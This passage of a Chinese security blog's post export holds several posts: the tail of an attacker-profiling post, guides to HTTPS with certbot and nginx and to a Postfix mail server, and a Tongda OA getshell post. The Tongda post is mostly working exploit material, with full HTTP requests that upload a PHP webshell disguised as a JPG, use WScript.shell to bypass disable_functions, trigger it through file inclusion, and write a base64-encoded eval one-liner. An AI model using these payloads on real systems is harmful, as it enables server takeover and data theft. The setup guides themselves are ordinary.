<p>4.信息的利用<br>    通过只言片语收集出来的攻击者信息：习惯、背景、性格、爱好、家乡、单位、所在地、出生年月日等信息。进行组合社工利用，还是前言说的一个优秀的蓝队必然是一个优秀的红队，拿个0day、1day博取攻击队信任又何尝不可呢？社工库查询的信息不一定有用，但是可以精确我们的判断。</p>
<p>PS：社会工程学就是使人们顺从你的意愿、满足你的欲望的一门艺术与学问。</p>
<p><img src="/images/blog/5845b41b20f60b1c8e0121efc6c635a6.png"></p>
<p><img src="/images/blog/9c50617f97cd065df288f02a7bf69eed.png"></p>
<p><code> https://github.com/SuperDolby/hw-</code></p>
]]></content>
  </entry>
  <entry>
    <title>网站设置https访问</title>
    <url>/2024/09/10/%E7%BD%91%E7%AB%99%E8%AE%BE%E7%BD%AEhttps%E8%AE%BF%E9%97%AE/</url>
    <content><![CDATA[<h3 id="0x0-申请域名并解析到你的IP"><a href="#0x0-申请域名并解析到你的IP" class="headerlink" title="0x0 申请域名并解析到你的IP"></a>0x0 申请域名并解析到你的IP</h3><p>域名注册推荐去<a href="https://www.godaddy.com/">godaddy</a><br>常用解析说明：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www   常见主机记录，将域名解析为 www.abc.com</span><br><span class="line">@     直接解析主域名 abc.com</span><br><span class="line">mail  将域名解析为 mail.abc.com，通常用于邮件服务</span><br><span class="line">*     泛解析，匹配其他所有域名 *.abc.com</span><br></pre></td></tr></table></figure>

<p>这里我们以【<a href="http://www.abc.com】为例/">www.abc.com】为例</a></p>
<h3 id="0x1-安装-certbot"><a href="#0x1-安装-certbot" class="headerlink" title="0x1 安装 certbot"></a>0x1 安装 certbot</h3><p>用户申请免费的证书</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install certbot</span><br></pre></td></tr></table></figure>

<h3 id="0x3-申请证书"><a href="#0x3-申请证书" class="headerlink" title="0x3 申请证书"></a>0x3 申请证书</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certbot certonly  --email abc@gmail.com -d www.abc.com</span><br><span class="line">#好了之后会在如下目录生成证书文件</span><br><span class="line">/etc/letsencrypt/live/www.abc.com</span><br><span class="line"></span><br><span class="line">[root@LfiekAe www.abc.com]# ls</span><br><span class="line">cert.pem  chain.pem  fullchain.pem  privkey.pem  README</span><br><span class="line">[root@LfiekAe www.abc.com]#</span><br></pre></td></tr></table></figure>

<h3 id="0x4-配置"><a href="#0x4-配置" class="headerlink" title="0x4 配置"></a>0x4 配置</h3><p>设置443端口的配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">        listen 443 ssl;</span><br><span class="line">        listen [::]:443 ssl;</span><br><span class="line">        server_name www.abc.com;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        ssl_certificate      /etc/nginx/ssl/fullchain.pem;    #这个是certbot生成的证书文件</span><br><span class="line">        ssl_certificate_key  /etc/nginx/ssl/privkey.pem;      #这个是certbot生成的证书文件</span><br><span class="line">        ssl_session_cache    shared:SSL:1m;</span><br><span class="line">        ssl_session_timeout  5m;</span><br><span class="line">        ssl_protocols TLSv1.2;</span><br><span class="line">        ssl_prefer_server_ciphers on;</span><br><span class="line">        ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:DHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">                root /usr/www/wkg;</span><br><span class="line">                index index.html index.htm;</span><br><span class="line">                try_files $uri $uri/ /index.html;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        location /api/ &#123;</span><br><span class="line">                proxy_pass http://127.0.0.1:7788/;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        location /ws/ &#123;</span><br><span class="line"></span><br><span class="line">                proxy_pass http://127.0.0.1:7788/;</span><br><span class="line">                proxy_http_version 1.1;</span><br><span class="line">                proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">                proxy_set_header Connection &quot;upgrade&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>80端口的配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        server_name localhost;</span><br><span class="line">        rewrite ^(.*)$ https://$host$1 permanent;    #重定向到https</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>通达OA文件上传&amp;文件包含getshell</title>
    <url>/2024/09/10/%E9%80%9A%E8%BE%BEOA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell/</url>
    <content><![CDATA[<h4 id="漏洞等级：高危"><a href="#漏洞等级：高危" class="headerlink" title="漏洞等级：高危"></a>漏洞等级：高危</h4><h4 id="漏洞影响版本："><a href="#漏洞影响版本：" class="headerlink" title="漏洞影响版本："></a>漏洞影响版本：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">V11版</span><br><span class="line">2017版</span><br><span class="line">2016版</span><br><span class="line">2015版</span><br><span class="line">2013增强版</span><br><span class="line">2013版</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">任意文件上传漏洞  /ispirit/im/upload.php</span><br><span class="line">本地文件包含漏洞  /ispirit/interface/gateway.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有些版本gateway.php路径不同</span><br><span class="line">如2013:</span><br><span class="line">/ispirit/im/upload.php</span><br><span class="line">/ispirit/interface/gateway.php</span><br><span class="line">2017：</span><br><span class="line">/ispirit/im/upload.php</span><br><span class="line">/mac/gateway.Php</span><br><span class="line">本文使用的v11版本路径为</span><br><span class="line">/ispirit/im/upload.php</span><br><span class="line">/ispirit/interface/gateway.php</span><br><span class="line">访问任意文件上传漏洞路径/ispirit/im/upload.php</span><br></pre></td></tr></table></figure>

<h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><p>这里使用了COM组件wscript.shell来绕过disable_function</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /ispirit/im/upload.php HTTP/1.1</span><br><span class="line">Host: 10.103.51.104</span><br><span class="line">Content-Length: 655</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBwVAwV3O4sifyhr3</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryBwVAwV3O4sifyhr3</span><br><span class="line">Content-Disposition: form-data; name=&quot;UPLOAD_MODE&quot;</span><br><span class="line"></span><br><span class="line">2</span><br><span class="line">------WebKitFormBoundaryBwVAwV3O4sifyhr3</span><br><span class="line">Content-Disposition: form-data; name=&quot;P&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryBwVAwV3O4sifyhr3</span><br><span class="line">Content-Disposition: form-data; name=&quot;DEST_UID&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryBwVAwV3O4sifyhr3</span><br><span class="line">Content-Disposition: form-data; name=&quot;ATTACHMENT&quot;; filename=&quot;jpg&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$command=$_POST[&#x27;cmd&#x27;];</span><br><span class="line">$wsh = new COM(&#x27;WScript.shell&#x27;);</span><br><span class="line">$exec = $wsh-&gt;exec(&quot;cmd /c &quot;.$command);</span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line">echo $stroutput;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryBwVAwV3O4sifyhr3--</span><br></pre></td></tr></table></figure>
<p>这里使用了COM组件wscript.shell来绕过disable_function</p>
<p>接下来访问文件包含利用的链接：&#x2F;ispirit&#x2F;interface&#x2F;gateway.php，</p>
<p>POST给json赋值，指定key为url，value为文件位置</p>
<p>修改为如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /ispirit/interface/gateway.php HTTP/1.1</span><br><span class="line">Host: 10.103.51.104</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 70</span><br><span class="line"></span><br><span class="line">json=&#123;&quot;url&quot;:&quot;/general/../../attach/im/2009/1066533428.jpg&quot;&#125;&amp;cmd=whoami</span><br></pre></td></tr></table></figure>
<p>成功执行命令！也可以把图片马的内容改为执行写入一句话的命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$fp = fopen(&#x27;test.php&#x27;, &#x27;w&#x27;);</span><br><span class="line">$a = base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==&quot;);</span><br><span class="line">fwrite($fp, $a);</span><br><span class="line">fclose($fp);</span><br></pre></td></tr></table></figure>
<p>修改文件名发包执行文件包含后，shell被成功写入：</p>
]]></content>
  </entry>
  <entry>
    <title>邮件服务器搭建</title>
    <url>/2024/09/10/%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<blockquote>
<p>我们这里只配置了SMTP（只能发送邮件不能接收）</p>
</blockquote>
<h3 id="0x1-环境"><a href="#0x1-环境" class="headerlink" title="0x1 环境"></a>0x1 环境</h3><ul>
<li>centos 7</li>
<li>postfix</li>
</ul>
<h3 id="0x2-安装"><a href="#0x2-安装" class="headerlink" title="0x2 安装"></a>0x2 安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install postfix</span><br></pre></td></tr></table></figure>

<h3 id="0x3-配置"><a href="#0x3-配置" class="headerlink" title="0x3 配置"></a>0x3 配置</h3><h4 id="设置主机名"><a href="#设置主机名" class="headerlink" title="设置主机名"></a>设置主机名</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost~]# hostnamectl set-hostname mail.xxxx.com</span><br><span class="line">[root@localhost~]# exec bash</span><br><span class="line">[root@mail.xxxx.com ~]#</span><br></pre></td></tr></table></figure>
<h4 id="启动并启用-Postfix-服务"><a href="#启动并启用-Postfix-服务" class="headerlink" title="启动并启用 Postfix 服务"></a>启动并启用 Postfix 服务</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># service postfix restart</span><br><span class="line"># service postfix restart</span><br><span class="line">或</span><br><span class="line"># systemctl start postfix</span><br><span class="line"># systemctl enable postfix</span><br></pre></td></tr></table></figure>

<h4 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 75行: 取消注释，设置hostname </span><br><span class="line">myhostname = mail.xxxx.com </span><br><span class="line"># 83行: 取消注释，设置域名 </span><br><span class="line">mydomain = xxxx.com </span><br><span class="line"># 99行: 取消注释 </span><br><span class="line">myorigin = $mydomain </span><br><span class="line"># 116行: 默认是localhost，我们需要修改成all</span><br><span class="line">inet_interfaces = all </span><br><span class="line"># 119行: 推荐ipv4，如果支持ipv6，则可以为all </span><br><span class="line">inet_protocols = ipv4 </span><br><span class="line"># 164行: 添加 </span><br><span class="line">mydestination = $myhostname, localhost.$mydomain, localhost, $mydomain </span><br><span class="line"># 264行: 取消注释，指定内网和本地的IP地址范围 </span><br><span class="line">mynetworks = 127.0.0.0/8</span><br><span class="line"># 419行: 取消注释，邮件保存目录</span><br><span class="line"> home_mailbox = Maildir/ </span><br></pre></td></tr></table></figure>

<p>配置好后重启一下服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># service postfix restart</span><br></pre></td></tr></table></figure>

<h4 id="测试发件"><a href="#测试发件" class="headerlink" title="测试发件"></a>测试发件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;email content&quot; | mail -s &quot;title&quot; test@xxxx.com</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="/images/blog/8364bf3367b4d169d0bae4420211628d.png"></p>
<blockquote>
<p>注意如下要更换发件人，需要在系统先创建用户,如：<br>useradd -m -s &#x2F;bin&#x2F;bash master<br>passwd master</p>
</blockquote>
]]></content>
  </entry>
</search>
